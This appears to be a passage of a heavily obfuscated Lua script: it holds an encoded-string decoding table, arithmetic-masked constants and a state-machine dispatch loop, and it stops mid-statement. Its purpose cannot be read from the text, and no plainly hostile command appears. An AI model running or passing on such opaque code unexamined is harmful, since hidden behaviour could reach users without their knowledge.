z={D=757833-757812;i=318880-318852;O=64569-64556,T=-842185+842202;n=423279+-423242,[""\051""]=-290776+290795,k=-499390+499425;[""\053""]=49578-49571,[""\050""]=733600-733555;L=-635160-(-635208),[""\056""]=-920159+920169,N=-879624+879662;u=353157+-353099,H=556909-556858;z=299024-299024;f=-985998-(-986038),Y=-802293-(-802327),m=-530182+530202;B=115020+-114958;Q=-276030+276045,b=177263-177227,K=481608+-481603;t=-1006544+1006591,r=824773+-824769,x=969075-969057,j=129597+-129570;v=-979054-(-979103),U=-370105+370168;P=582560+-582505,[""\043""]=573863+-573809;G=659308+-659278;C=796485-796453,M=-885034+885060;h=-887701-(-887747),o=612586-612526,J=-4966+5010;[""\049""]=615257+-615214,[""\057""]=487698+-487669;I=843459-843400,s=-613010-(-613011),q=916872-916831,V=-554056-(-554117),A=-803568-(-803574),S=-701185+701194,a=-278744+278760,Z=654553-654497;X=-860348-(-860379),y=-34922+34975,E=-559242+559245,R=608914+-608903,[""\047""]=-841759+841773;p=-719514+719571,[""\055""]=-222526+222551;d=765488-765455,W=372854-372812;[""\052""]=-300224+300274;c=-164200+164222;F=-4007-(-4019);[""\054""]=-558010-(-558062);g=-141068+141107,e=331179+-331155;[""\048""]=83735-83733,l=321140-321132,w=-1020887+1020910}local C=math.floor local E=string.sub local D=table.insert local u=string.len local G=string.char local S=table.concat local B=d local s=type for d=20301+-20300,#B,849510-849509 do local l=B[d]if s(l)==""\115\116\114\105\110\103""then local s=u(l)local P={}local O=-1037467-(-1037468)local j=745700-745700 local Y=443408-443408 while O<=s do local d=E(l,O,O)local u=z[d]if u then j=j+u*(452176+-452112)^((669681-669678)-Y)Y=Y+(805526-805525)if Y==342800+-342796 then Y=526664+-526664 local d=C(j/(644084-578548))local z=C((j%(155337+-89801))/(-657405-(-657661)))local E=j%(1032235-1031979)D(P,G(d,z,E))j=376318+-376318 end elseif d==""\061""then D(P,G(C(j/(769115+-703579))))if O>=s or E(l,O+(-256640-(-256641)),O+(-857967+857968))~=""\061""then D(P,G(C((j%(25874-(-39662)))/(500434-500178))))end break end O=O+(-401764+401765)end B[d]=S(P)end end end return(function(d,E,D,u,G,S,B,I,j,L,T,P,C,y,s,w,R,O,F,l,h,r,Y)R,r,T,Y,F,j,I,s,y,h,C,O,w,P,L,l=function(d,z)local E=j(z)local D=function(D,u,G,S)return C(d,{D;u,G,S},z,E)end return D end,function(d,z)local E=j(z)local D=function(D,u,G)return C(d,{D,u,G},z,E)end return D end,function(d)l[d]=l[d]-(-132993+132994)if l[d]==-528021-(-528021)then l[d],s[d]=nil,nil end end,function(d)local z,C=929467+-929466,d[405043-405042]while C do l[C],z=l[C]-(772970+-772969),z+(507098+-507097)if-124182+124182==l[C]then l[C],s[C]=nil,nil end C=d[z]end end,function(d,z)local E=j(z)local D=function(D,u)return C(d,{D;u},z,E)end return D end,function(d)for z=-452272+452273,#d,-71363-(-71364)do l[d[z]]=l[d[z]]+(-734972+734973)end if D then local C=D(true)local E=G(C)E[z(871325+-895023)],E[z(61364+-85240)],E[z(-989069-(-964986))]=d,Y,function()return 341819+-256628 end return C else return u({},{[z(389485+-413361)]=Y,[z(824588+-848286)]=d;[z(-465844+441761)]=function()return 336423+-251232 end})end end,function(d,z)local E=j(z)local D=function(D)return C(d,{D},z,E)end return D end,{},function(d,z)local E=j(z)local D=function(D,u,G,S,B)return C(d,{D,u,G;S,B},z,E)end return D end,function(d,z)local E=j(z)local D=function(D,u,G,S,B,s)return C(d,{D;u;G,S;B;s},z,E)end return D end,function(C,D,u,G)local X,Ge,Z,K,Re,ue,We,H,A,f,de,U,k,o,Te,g,l,j,Ne,t,ge,Le,Ie,p,c,B,Me,je,ce,Pe,Ye,he,Qe,re,Y,se,Q,ze,oe,Ee,V,n,Ce,e,q,we,ye,O,Oe,v,Se,ee,ne,Ze,b,w,m,J,ie,le,i,De,Be,x,M,N,Fe,a,W while C do if C<9690934-719464 then if C<795306+4668731 then if C<-928439+3926528 then if C<-918656+2219253 then if C<80050-(-541213)then if C<-854086+956536 then if C<580991+-560814 then if C<241903-230815 then Q=-1047194+31121222120245 e=z(380507-404095)O=s[u[720472+-720469]]Y=s[u[-129483+129484]]w=s[u[26957+-26955]]o=w(e,Q)j=Y[o]l=O[j]B=l C=l and 962947+10396852 or 981097+3181940 else B=A C=v C=614032+9392017 end else if C<975924+-888677 then C=s[u[19906-19901]]M=9719495326574-(-595519)Q=s[u[-36448+36449]]H=z(-215754-(-192087))N=z(-63114-(-39544))n=s[u[911659-911657]]q=5784376981582-11721 g=16696237410212-(-988858)c=n(N,g)g=z(-867612+843730)B=z(-978840-(-955052))e=Q[c]a=26965337791974-978138 Z=1018126+34991708550808 n=s[u[115274-115273]]c=s[u[729471+-729469]]N=c(g,Z)Z=z(-132826+108791)Q=n[N]c=s[u[1026931+-1026930]]N=s[u[-254579+254581]]g=N(Z,M)W=z(-805433-(-781580))n=c[g]g=s[u[497507+-497506]]x=z(894840+-918774)Z=s[u[674372-674370]]M=Z(W,q)N=g[M]Z=s[u[-1010952-(-1010958)]]q=s[u[-348858-(-348859)]]K=s[u[-430529+430531]]k=20484092163985-381519 i=K(H,a)B=C[B]W=q[i]H=s[u[-664148+664149]]a=s[u[488439-488437]]p=a(x,k)i=H[p]K=i..j q=w..K M=W..q g=Z..M c=N..g o={[e]=Q;[n]=c}B=B(C,o)C=12183631-(-88345)else C=true s[u[-613731-(-613734)]]=C C=17664+9808587 end end else if C<478264+-44200 then if C<985722-789631 then l=s[u[561058+-561049]]C=l and 6656530-(-555650)or 4203941-(-966487)else w=z(-639612-(-615932))C=s[u[377571+-377567]]Y={C(l)}j=Y[-7426+7429]O=Y[611522-611520]B=Y[657414+-657413]Y=B c=34949403746447-352509 B=d[w]o=s[u[985619+-985618]]e=s[u[77153+-77151]]n=z(804166-828020)Q=e(n,c)w=o[Q]n=z(211064+-234982)C=B[w]o=s[u[-433240+433241]]c=-1011429+28461792240298 e=s[u[-540305-(-540307)]]Q=e(n,c)w=o[Q]B=C(w)n=z(590146-613792)o=s[u[-1038008-(-1038009)]]e=s[u[-345404+345406]]c=20279338606790-(-951325)Q=e(n,c)w=B B=o[Q]C=Y==B C=C and-852306+930840 or 14860330-(-49342)end else if C<32684-(-462327)then C=s[u[359178-359177]]B=z(-868505-(-844465))B=C[B]B=B(C)C=5223454-(-962884)else C=true C=C and 8131795-(-476659)or 15655848-262373 end end end else if C<262800-(-568247)then if C<-321871+1113209 then if C<1571840-890359 then O=s[u[-986903-(-986904)]]j=s[u[-419282-(-419284)]]o=33262156650040-285112 w=z(1010043+-1033719)Y=j(w,o)C=O[Y]B={C}C=d[z(7093+-30722)]else B=Y C=3321514-280911 end else if C<1847519-1032763 then B=w C=o C=-746691+14088353 else B=s[u[655641+-655640]]Q=19021190002236-185251 e=z(-1036634+1012698)w=s[u[-318361-(-318363)]]o=w(e,Q)C=B[o]B=true e=z(-383340-(-359306))Y[C]=B Q=243044+22503973598091 B=s[u[689028-689027]]w=s[u[-61775+61777]]o=w(e,Q)C=B[o]B=l Y[C]=B C=14299428-(-251929)end end else if C<-435840+1706397 then if C<100488-(-1040067)then C=s[u[-776971-(-776981)]]O=s[u[521907+-521896]]l[C]=O C=s[u[258290+-258278]]O={C(l)}C=d[z(-37663-(-13648))]B={E(O)}else se=P()C=11502648-631920 De=Se s[se]=Be Be=se Pe=s[O]we=-291906+20813265623581 Fe=32034372741506-290621 Te=z(-684122+660544)Oe=s[Y]Re=z(555188-579274)Ye=Oe(Te,we)je=Pe[Ye]De=nil Oe=s[Be]Te=s[O]we=s[Y]se=z(974458+-998291)re=we(Re,Fe)Re=1405098796319-74385 Ye=Te[re]re=z(247191-270768)Pe=Oe[Ye]Ye=s[O]Te=s[Y]we=Te(re,Re)Oe=Ye[we]Ye=L(-1004602+7764738,{O;Y,Be})le={[je]=Pe,[Oe]=Ye}se=ze[se]se=se(ze,le)Be=T(Be)end else Z=24624528022741-(-446453)g=z(-624362+600658)B=s[w]n=s[u[1022008+-1022006]]C=-756959+8878766 c=s[u[348404+-348401]]N=c(g,Z)Q=n[N]n=false B[Q]=n end end end else if C<-81409+2452676 then if C<2333189-254718 then if C<1393131-(-99540)then if C<-280630+1682103 then C=-80013+3100923 else C=s[u[-178819+178826]]C=C and 10621747-74838 or 8656609-27770 end else if C<2991729-1016626 then O=z(-810187-(-786582))B=1294827-(-854703)j=11769559-635721 l=O^j C=B-l B=z(539985-563881)l=C C=B/l B={C}C=d[z(189132-212903)]else l=z(-364321-(-340323))B=z(-585257+561656)C=d[B]B=C(l)B={}C=d[z(733507+-757527)]end end else if C<1250795-(-895648)then if C<1291397-(-801892)then K=s[O]q=K C=K and-665963+14542369 or 4650660-329909 else C=B and 7515462-682149 or 5945800-(-83143)end else if C<2778237-544529 then H=z(435165-459020)C=d[H]H=z(399151+-422693)d[H]=C C=4149005-298863 else l=D[46113-46112]C=l Y=z(-904159+880258)Q=z(-743567-(-719851))s[u[743442+-743441]]=C j=d[Y]c=10875135256393-873345 n=-451270+17696644809462 w=s[u[-953681+953683]]o=s[u[254892+-254889]]e=o(Q,n)Y=w[e]O=j[Y]Q=332134+14935971563973 Y=s[u[215075+-215073]]w=s[u[74152+-74149]]e=z(806064-829985)o=w(e,Q)j=Y[o]B=O[j]O=B n=z(-247297+223724)o=s[u[407506+-407504]]e=s[u[123274-123271]]Q=e(n,c)w=o[Q]Y=O[w]B=Y j=C C=Y and 11680206-(-887795)or-990771+17368169 end end end else if C<535391+2137644 then if C<32018+2448775 then if C<951222+1491624 then H=s[n]M=C W=not H C=W and 5500355-258299 or-311160+7645612 Z=W else w=P()l=D C=true Y=P()Q=R(14716868-792485,{w})j=z(766999+-790720)O=P()s[O]=C B=d[j]j=z(239459-263392)e=z(-230623+206930)C=B[j]j=P()s[j]=C C=r(-264255+2271894,{})s[Y]=C C=false s[w]=C o=d[e]e=o(Q)B=e C=e and 10258111-937501 or 226644+4063173 end else if C<3566748-965273 then C=4327390-535708 O=s[u[-975040-(-975042)]]Y=s[u[891298+-891295]]Q=1002813+6635057184468 w=s[u[37053+-37049]]e=z(977380+-1001087)o=w(e,Q)j=Y[o]l=O[j]B=l else M=s[Z]U={M(W)}V=z(276879+-300847)a=U[-16187+16188]x=U[-388029-(-388031)]f=-344590+23882017910142 M=P()s[M]=x k=U[-94304-(-94307)]b=s[O]m=s[Y]t=m(V,f)U=b[t]x=a==U C=x and 13749556-590527 or 254141+9989752 end end else if C<-116199+3062375 then if C<652948+2113092 then C=false B={}s[u[-489916+489917]]=C C=d[z(1021341+-1044915)]else M=7605627858846-(-826935)q=z(-805727-(-782040))Z=z(147505+-171137)H=z(241453-265480)B=s[u[100841-100840]]c=o N=s[u[329557-329555]]K=16894820348111-(-814572)g=N(Z,M)C=B[g]p=-510011+31020190711975 g=z(874704+-898544)N=d[g]Z=s[u[-293506-(-293507)]]M=s[u[82269-82267]]W=M(q,K)a=14750603190848-(-358548)g=Z[W]B=N[g]M=s[u[301161-301158]]q=s[u[-390787+390788]]K=s[u[-465865-(-465867)]]i=K(H,a)W=q[i]Z=M[W]q=z(635424-659313)W=d[q]K=s[u[958553+-958552]]a=z(622186+-645794)i=s[u[-390255-(-390257)]]H=i(a,p)q=K[H]M=W[q]K=-783936+783941 q=903374-903374 i=964567-964567 c=nil W=M(q,K,i)g=Z+W q=274047+9538902680282 N=B(g)Y[C]=N N=z(-999821-(-976199))B=d[N]g=s[u[724559-724558]]Z=s[u[238411-238409]]W=z(591630-615604)M=Z(W,q)N=g[M]C=B[N]N=.05 B=C(N)C=7727748-857070 end else Z=2334570104370-(-933389)n=s[u[-414947-(-414950)]]c=s[u[-481717-(-481721)]]g=z(-206161+182514)C=-1011050+6866971 N=c(g,Z)Q=n[N]e=w[Q]o=e end end end end else if C<3039260-(-811028)then if C<463416+3097411 then if C<3254744-195988 then if C<915376+2127488 then if C<331668+2707266 then C=d[z(771342-795348)]B={}l=nil else C=w C=not B C=C and-803999+8384151 or 556527+6754328 end else if C<3692434-646153 then l=s[u[137519-137518]]B=#l l=793662-793662 C=B==l C=C and 12378444-383923 or-643359+11683801 else C=o C=B and 6049286-413773 or 14526540-636979 end end else if C<-565333+3860778 then if C<2281564-(-963732)then m=z(1016676-1040577)U=z(-541902+518351)J=z(207119+-230682)x=d[U]De=12732869680429-(-784892)b=d[m]V=s[O]Ce=12954459453274-(-1024054)f=s[Y]X=f(J,Ce)de=655997+32025316603843 t=V[X]J=475609+11218258956942 V=z(342181+-365854)V=b[V]ue=14964051115982-353430 m={V(b,t)}C=-49851+10639617 ze=1001991+23449957507232 Ge=z(460623+-484691)Ce=-757753+1459764105888 U=x(E(m))x=U()t=s[O]X=z(-963378+939467)V=s[Y]f=V(X,J)m=t[f]V=s[O]Ee=366706+20667285605669 f=s[Y]J=z(-717576-(-693569))X=f(J,Ce)Ce=z(197126-221032)t=V[X]f=s[O]X=s[Y]J=X(Ce,de)V=f[J]de=z(-965497-(-941712))X=s[O]J=s[Y]Ce=J(de,ze)ze=z(564102-588000)f=X[Ce]J=s[O]Se=454658+23494623394490 Ce=s[Y]de=Ce(ze,Ee)X=J[de]Ee=z(-677845+653917)Ce=s[O]de=s[Y]ze=de(Ee,De)J=Ce[ze]De=z(-856635+833031)de=s[O]ze=s[Y]Ee=ze(De,ue)Ce=de[Ee]Ee=s[O]De=s[Y]ue=De(Ge,Se)ze=Ee[ue]U=z(-460643+436871)Se=16073582650992-(-46796)Ee=false de={[ze]=Ee}Ge=z(175543-199571)Ee=s[O]De=s[Y]ue=De(Ge,Se)ze=Ee[ue]Ee=false U=x[U]b={[m]=t;[V]=f;[X]=J,[Ce]=de;[ze]=Ee}X=z(839351-863143)U=U(x,b)x=nil Ee=24511006097684-578687 b=z(-546652-(-522722))J=-114066+23238538307543 Ce=27686895315046-(-18934)t=s[O]de=938959+28706579275880 V=s[Y]f=V(X,J)m=t[f]t=nil b=U[b]b=b(U,m,t)ze=486801+22004441905781 m=z(-459206-(-435423))J=z(1000234-1023992)V=s[O]f=s[Y]X=f(J,Ce)Ce=z(-663047-(-639257))t=V[X]m=b[m]m=m(b,t)f=s[O]m=z(940181-963730)X=s[Y]J=X(Ce,de)V=f[J]de=z(-172898+148999)X=s[O]J=s[Y]Ce=J(de,ze)ze=z(-309040+285440)m=b[m]f=X[Ce]J=s[O]Ce=s[Y]de=Ce(ze,Ee)Ee=18977562774788-879231 X=J[de]J=s[n]t={[V]=f;[X]=J}de=265090+32046832234184 m=m(b,t)f=s[O]X=s[Y]Ce=z(93267+-116991)U=nil J=X(Ce,de)V=f[J]X=s[O]ze=-909181+24640897043535 J=s[Y]de=z(556903-580489)Ce=J(de,ze)ze=z(-588231+564229)f=X[Ce]J=s[O]Ce=s[Y]de=Ce(ze,Ee)X=J[de]J=I(14683396-745533,{n})t={[V]=f,[X]=J}m=z(370613+-394446)m=b[m]m=m(b,t)b=nil else O=y(894282+12059092,{u[144310+-144309]})B=z(-552688-(-528995))C=d[B]j={C(O)}l=j[-782382-(-782384)]B=j[907638+-907637]j=P()s[j]=l O=B l=not O B=l C=l and 15047718-(-800417)or 9654344-268367 end else if C<2998404-(-379335)then i=126868-126867 H=946202+-946196 C=s[e]K=C(i,H)C=z(140558+-164413)d[C]=K H=z(-527280+503425)i=d[H]H=-525305+525307 C=i>H C=C and 6883001-(-552763)or 468593+1724674 else B={}C=d[z(-982268+958559)]l=nil end end end else if C<3589670-(-197820)then if C<3602475-(-134819)then if C<-111842+3700026 then H=1014089-1014089 W=#Z M=W==H C=M and 4990019-(-548561)or 8578585-731508 else e=not o j=j+w O=j<=Y O=e and O e=j>=Y e=o and e O=e or O e=11302787-438992 C=O and e O=230203-(-732152)C=C or O end else if C<4283938-516827 then Q=377369+23414561138814 C=z(278524+-302580)o=z(-950266-(-926458))j=s[u[-524976-(-524977)]]O=B Y=s[u[546766+-546764]]e=-83557+17533709297225 w=Y(o,e)C=O[C]e=z(-704937+680889)B=j[w]C=C(O,B)Y=s[u[1005624+-1005623]]j=C w=s[u[-419940+419942]]o=w(e,Q)B=Y[o]C=z(393443-417107)C=O[C]C=C(O,B)Y=C w=C C=j and 1266949-524507 or-165966+3206569 B=j else C=s[u[760557+-760556]]C=C and 565652+-97740 or 974564+5211774 end end else if C<2805240-(-1043141)then if C<2937734-(-872643)then C=B and 11409273-23767 or-412274+9025582 else C=8900171-(-537040)end else C=6219598-(-113922)end end end else if C<382596+4147025 then if C<980615+3219304 then if C<4370995-303822 then if C<320591+3720676 then Q=c i=z(673442+-697163)K=d[i]i=z(-526425+502343)q=K[i]K=q(l,Q)q=s[u[93990+-93984]]i=q()W=K+i C=570003+4937921 M=W+o W=-562827-(-563083)Z=M%W i=389846+-389845 o=Z W=j[O]Q=nil K=o+i q=Y[K]M=W..q j[O]=M else e=7341302922194-(-643464)l=D[-318230-(-318231)]j=s[u[-884741-(-884742)]]Y=s[u[-839012-(-839014)]]o=z(358678+-382672)n=z(255096+-278824)w=Y(o,e)O=j[w]B=l[O]w=z(365632-389314)Y=d[w]o=s[u[-659294-(-659295)]]c=-771409+20628081765078 e=s[u[733795-733793]]Q=e(n,c)w=o[Q]j=Y[w]w=s[u[-659904+659905]]Q=z(-631751-(-607826))n=21324439474096-(-5913)o=s[u[-987516+987518]]e=o(Q,n)Y=w[e]O=j[Y]C=B==O C=C and-326420+9417728 or 667951+2352959 end else if C<3683943-(-475082)then B={}C=d[z(-106913-(-83179))]else l=B C=l and-719784+15608840 or 1041051+5523982 end end else if C<-377413+4682287 then if C<305378+3979988 then Y=s[u[912800+-912799]]N=21506728043733-1015223 e=z(430244-454315)w=s[u[92202+-92200]]Q=550839186609-(-707663)c=z(975726+-999344)o=w(e,Q)j=Y[o]o=z(-1030833+1007151)O=l[j]w=d[o]e=s[u[1026466+-1026465]]Q=s[u[270793-270791]]n=Q(c,N)o=e[n]n=z(851477+-875119)Y=w[o]o=s[u[845025+-845024]]c=-991429+11328649311584 e=s[u[-950385+950387]]Q=e(n,c)w=o[Q]j=Y[w]B=O==j C=B and 11088215-(-888011)or 234195+1088127 else e=z(-520785-(-497205))Q=z(-804710-(-780919))o=B B=d[e]e=z(-866721+842848)C=B[e]e=P()s[e]=C g=z(-96847+73056)B=d[Q]Q=z(-41551-(-17791))C=B[Q]N=d[g]c=C n=N Q=C C=N and 14264239-(-45564)or 13870580-(-43132)end else if C<3675068-(-819828)then s[O]=q C=s[O]C=C and 8359424-318541 or 6749212-(-896887)else f=s[O]Ce=z(-943246+919199)C=V de=15123402510181-553955 X=s[Y]J=X(Ce,de)C=d[z(490051-513926)]a=z(506042-529691)a=M[a]V=f[J]f=-797985+797991 B={}k={[U]=b,[m]=t,[V]=f}a=a(M,x,k)end end end else if C<-273400+5428786 then if C<-594767+5379630 then if C<886731+3648414 then n=T(n)N=nil M=nil Q=nil w=T(w)O=T(O)n=z(456027-479748)O=nil e=T(e)C=1002973+12168532 o=nil W=T(W)o=z(-301861+278281)Y=T(Y)c=T(c)M=453754+-453753 Z=nil g=nil j=T(j)Q=z(934969+-958760)j=nil Y=P()N={}g=P()s[Y]=O e=z(-139323-(-115743))O=P()s[O]=j w=d[o]o=z(-528092+504365)j=w[o]w=P()s[w]=j W=-647199-(-647455)o=d[e]e=z(509724-533597)j=o[e]e=d[Q]Q=z(553994+-577973)o=e[Q]Q=d[n]n=z(768737+-792316)e=Q[n]Q=-10904-(-10904)c=P()n=P()s[n]=Q Q=459503-459501 Z={}s[c]=Q Q={}s[g]=N N=1042983+-1042983 H=W W=534003-534002 a=W W=89080+-89080 p=a<W W=M-a else C=640008+2889248 end else if C<5710815-620992 then o=s[u[162758+-162755]]n=z(1023571-1047625)c=-90029+10679269896985 e=s[u[1024168-1024164]]Q=e(n,c)C=o[Q]o=false w[C]=o C=15274826-347838 else Q=z(110081+-133879)C=1610868-(-519242)w=s[u[1021351-1021350]]o=s[u[-671557-(-671559)]]n=-749128+12548082976027 e=o(Q,n)Y=w[e]j=l[Y]O=not j B=O end end else if C<-305368+5555834 then if C<-285501+5464959 then O=C j=s[u[-261123-(-261129)]]l=j C=j and 490002+10021225 or 12729735-213655 else N=Z C=M C=13481081-947886 end else w=z(-438949+414952)l=z(167127-190749)o=904286+33682858684646 B=d[l]O=s[u[252126-252125]]j=s[u[198668+-198666]]Y=j(w,o)l=O[Y]C=B[l]l=-518477+518537 B=C(l)C=B and-822668+15677701 or 1034266+12191271 end end end end end else if C<-1005903+8271511 then if C<6841119-333509 then if C<-388498+6370447 then if C<6349208-808425 then if C<912479+4616905 then if C<6212622-707262 then k=T(k)U=T(U)p=T(p)x=T(x)a=T(a)C=4855530-(-681602)m=nil b=T(b)else Z=not g c=c+N Q=c<=n Q=Z and Q Z=c>=n Z=g and Z Q=Z or Q Z=-766341+4624324 C=Q and Z Q=14723237-(-965426)C=C or Q end else if C<840676+4697815 then q=q+i B=q<=K a=not H B=a and B a=q>=K a=H and a B=a or B a=14895517-965829 C=B and a B=2447670-359773 C=C or B else Q=nil m=z(-849856+826221)M={}W=P()t=nil s[W]=M U=z(-21738-1960)a=P()H=R(689232+2354349,{W;n,c;w})N=nil M=P()s[M]=H e=nil H={}o=nil s[a]=H x={}p=z(20564-44425)w=T(w)j=nil H=d[p]j=1.04657150494e+14 b=s[a]k={[U]=b,[m]=t}p=H(x,k)s[O]=p H=y(233470+11213827,{a,W,g,n;c,M})M=T(M)a=T(a)W=T(W)g=T(g)Q=z(155481-179382)s[Y]=H g=z(-489972-(-466055))n=T(n)e=d[Q]Z=nil Z=3436072400411-995291 c=T(c)n=s[O]c=s[Y]N=c(g,Z)Q=n[N]o=e[Q]w=o~=j C=w and 11319696-572847 or 10259783-91688 end end else if C<-284005+6078242 then if C<4840925-(-829981)then B={}C=d[z(29786-53382)]else B=s[u[180806-180802]]C=B and 12831196-22901 or 859778+14887238 end else if C<6596734-640115 then C=o and-503047+5338054 or 14813683-(-113305)else Z=z(985731-1009541)g=4971550407159-(-495380)W=15707382985557-(-125245)N=z(834908-858480)Q=s[u[471040-471039]]n=s[u[-575820+575822]]c=n(N,g)C=Q[c]c=s[u[578214+-578213]]M=34944245759117-(-672515)N=s[u[-512130+512132]]g=N(Z,M)n=c[g]M=z(734893+-758702)Q=o[n]N=s[u[472660+-472659]]g=s[u[429545-429543]]Z=g(M,W)c=N[Z]n=o[c]B={C,Q;n}C=d[z(519885-543773)]end end end else if C<6605705-266633 then if C<-986254+7171066 then if C<5286495-(-779357)then B=z(-937595-(-913878))C=d[B]o=s[u[-20096-(-20097)]]e=s[u[-712634-(-712636)]]c=-122681+2709292180518 n=z(957618+-981448)Q=e(n,c)w=o[Q]Y=l[w]w={C(Y)}O=w[-799858-(-799860)]C=-614914+9584334 j=w[-357273+357276]B=w[-22422+22423]Y=B else l=z(-961458+937646)B=d[l]o=581341+18434750464683 O=s[u[535569-535568]]j=s[u[-478612-(-478614)]]w=z(922826-946792)Y=j(w,o)l=O[Y]C=B[l]C=C and 395592-392940 or 15741438-424265 end else if C<774477+5460749 then C=d[z(-823825-(-800083))]B={}else C=true C=C and-858427+4223777 or 15127721-(-199788)end end else if C<-312457+6783297 then if C<-901244+7366900 then o=22039972133065-(-569166)w=z(-1062998-(-1039439))B=z(-956158+932257)C=d[B]O=s[u[850041+-850040]]B=z(880506+-904178)j=s[u[-495203+495205]]B=C[B]Y=j(w,o)l=O[Y]B=B(C,l)l=z(603382-627136)l=B[l]C={l(B)}B={E(C)}C=d[z(285276-308998)]else Y=z(-780769+756880)j=d[Y]n=-338882+26451277536223 Q=z(-247947+224140)w=s[u[145937+-145934]]o=s[u[483326+-483322]]e=o(Q,n)Y=w[e]w=630712-630711 B=j[Y]Y=430294+-430294 o=-221659+221659 j=B(Y,w,o)C=O+j O=C C=13280850-(-428778)end else C=false s[u[-29736-(-29737)]]=C B={}C=d[z(344017+-367657)]end end end else if C<872203+5986894 then if C<5869137-(-775429)then if C<6727012-163691 then if C<5687731-(-869675)then n=P()c=415211+-415208 s[n]=B N=222394-222329 Z=z(-972980+949287)C=s[e]i=z(-777932-(-754113))B=C(c,N)c=P()s[c]=B C=633503+-633503 M=F(-915326+13843661,{})B=d[Z]N=C C=753722-753722 Z={B(M)}g=C C={E(Z)}B=478082+-478080 Z=C C=Z[B]B=z(-857751-(-834083))M=C C=d[B]W=s[j]K=d[i]i=K(M)K=z(-79492-(-55940))q=W(i,K)W={q()}B=C(E(W))W=P()s[W]=B C=217066+5320066 B=209573+-209572 q=s[c]K=q q=692285-692284 i=q q=367017-367017 H=i<q q=B-i else e=474081+3395631024716 l=D[-424629-(-424630)]O=z(-1014698+991076)B=d[O]o=z(-146664-(-122714))j=s[u[-1018147-(-1018148)]]Y=s[u[801984-801982]]w=Y(o,e)O=j[w]C=B[O]O=969561-969560 B=C(O)C=s[u[422967-422964]]C=C and 11851621-177251 or 4287913-758657 end else if C<-885711+7464648 then l=nil C=15166808-(-150365)else C=992750+13647955 end end else if C<5817885-(-973231)then if C<7436089-750280 then C=-753653+13925158 M=W x=M Z[M]=x M=nil else O=z(-545544-(-521643))l=d[O]j=s[u[916613+-916612]]e=98604+10876412187292 Y=s[u[-544376-(-544378)]]o=z(-123039-(-98966))w=Y(o,e)O=j[w]e=z(-102063+78227)w=z(842102+-865954)o=-202032+23088418455343 B=l[O]O=s[u[161709+-161708]]Q=117642+7450231079427 j=s[u[611780-611778]]Y=j(w,o)l=O[Y]C=B[l]l=C Y=s[u[359712+-359711]]w=s[u[-790149+790151]]o=w(e,Q)j=Y[o]O=l[j]C=O and 2994530-(-765890)or 11350458-83113 B=O end else if C<7007727-215371 then H=41864-41864 W=#Z C=8057452-210375 M=W==H else Y=z(-504493+480706)w=-210099+26897939096992 B=s[u[-802819+802820]]O=s[u[589888+-589886]]j=O(Y,w)C=B[j]w=z(144303-168065)o=364451+29505854498312 O=s[u[210696-210695]]j=s[u[-470789+470791]]Y=j(w,o)B=O[Y]B={C;B}C=d[z(-894948+870977)]end end end else if C<6703539-(-480064)then if C<7788395-861626 then if C<6750011-(-131636)then c=not n o=o+Q B=o<=e B=c and B c=o>=e c=n and c B=c or B c=-390093+3334495 C=B and c B=688348+15907323 C=C or B else n=5010607214350-(-260623)Q=z(680508+-704434)j=s[u[-332755+332764]]w=s[u[-871002-(-871005)]]o=s[u[-631207+631211]]N=z(-167832-(-143939))g=4515460610704-(-134566)e=o(Q,n)C=15103445-(-453925)Y=w[e]Q=s[u[-584000-(-584003)]]n=s[u[847844+-847840]]c=n(N,g)e=Q[c]o=O[e]e=s[u[729567-729557]]w=o*e j[Y]=w end else if C<-339610+7317134 then C=false s[u[-680917-(-680920)]]=C C=4104454-(-161563)else C=d[z(-563871-(-540260))]B={}end end else if C<7917836-670425 then if C<113803+7108986 then C=4160283-(-1010145)l=s[u[242699-242690]]O=z(85831+-109871)O=l[O]O=O(l)else j=-851601+851731 O=s[u[-171342-(-171345)]]l=O*j O=939629+-939372 B=l%O s[u[-981031+981034]]=B C=9822218-(-722595)end else C=1026544+12918470 e=nil end end end end else if C<-6882+7997277 then if C<8665640-1012618 then if C<1037604+6405126 then if C<7689240-363890 then if C<7620525-299810 then e=z(207320-231002)o=d[e]N=z(1006311+-1030075)g=18609423858180-(-206805)Q=s[u[-482565+482566]]n=s[u[699154-699152]]c=n(N,g)e=Q[c]w=o[e]e=s[u[980696-980695]]C=z(735075+-759014)Z=-463037+31158769305962 N=468711+30974742761840 c=z(143225+-167117)Q=s[u[-822368+822370]]n=Q(c,N)o=e[n]C=j[C]B=w[o]C=C(j,B)B=s[u[584304-584303]]w=s[u[-785766+785768]]Q=9767810580536-(-168332)e=z(-686214+662617)o=w(e,Q)c=-318823+21934405485901 C=B[o]B=true j[C]=B w=z(924779+-948479)g=z(-653902-(-630203))B=d[w]o=s[u[-333078+333079]]e=s[u[267469-267467]]n=z(-409798-(-385785))Q=e(n,c)c=-51103+31813966479741 n=z(-459271+435422)w=o[Q]C=B[w]o=s[u[267266-267265]]e=s[u[-568323+568325]]Q=e(n,c)W=13515104614620-827463 w=o[Q]c=4743471612053-899061 B=C(w)w=P()s[w]=B n=z(-600860+576823)C=s[w]o=s[u[-609394+609395]]e=s[u[388451-388449]]Q=e(n,c)B=o[Q]Q=z(-529424-(-505535))e=d[Q]n=s[u[341116+-341115]]c=s[u[939059-939057]]N=c(g,Z)Q=n[N]o=e[Q]n=447476+-447475 c=952623-952615 Q=-516714+516722 e=o(Q,n,c)C[B]=e C=s[w]c=19049570931514-766100 o=s[u[-260258+260259]]n=z(-442505-(-418685))e=s[u[95665+-95663]]Q=e(n,c)B=o[Q]o=true c=525373+8414040083217 n=z(-1026002-(-1002067))C[B]=o M=45252+14127462803694 C=s[w]o=s[u[-128756+128757]]e=s[u[-877199+877201]]Q=e(n,c)B=o[Q]o=-392699-(-392700)C[B]=o C=s[w]c=744952+27734906131579 o=s[u[46098-46097]]Z=z(68967+-92656)e=s[u[280619-280617]]n=z(263266-287109)Q=e(n,c)c=29620212653082-91706 B=o[Q]o=true C[B]=o C=s[w]o=s[u[-532425-(-532426)]]e=s[u[-557368-(-557370)]]n=z(121973+-146022)Q=e(n,c)B=o[Q]Q=s[u[404572+-404569]]c=s[u[1019727-1019726]]N=s[u[-913301+913303]]g=N(Z,M)n=c[g]M=z(300772-324337)e=Q[n]c=z(-673148-(-649259))n=d[c]N=s[u[189231+-189230]]g=s[u[522518+-522516]]Z=g(M,W)c=N[Z]g=656229-656229 Q=n[c]N=-656186+656189 c=-812883-(-812883)n=Q(c,N,g)o=e-n C[B]=o n=z(-376912+353330)C=s[w]o=s[u[807665+-807664]]e=s[u[462519-462517]]c=-813883+12462848655846 